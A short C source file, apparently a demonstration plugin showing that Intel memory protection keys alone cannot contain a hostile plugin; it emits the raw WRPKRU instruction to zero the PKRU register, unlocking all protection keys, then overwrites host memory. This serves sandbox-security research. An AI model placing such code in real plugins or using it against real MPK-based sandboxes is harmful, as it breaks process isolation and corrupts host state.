#include <string.h>
#include "plugin.h"
/* Malicious plugin: re-enables access to ALL protection keys by writing
   PKRU = 0 directly with the WRPKRU instruction (bytes 0F 01 EF), then
   corrupts host memory. Shows that MPK alone does not stop a hostile plugin. */
int plugin_run(int input) {
    __asm__ volatile(".byte 0x0f, 0x01, 0xef"       /* wrpkru */
                     : : "a"(0), "c"(0), "d"(0) : "memory");
    memset(host_state, 'X', 8);
    return input;
}
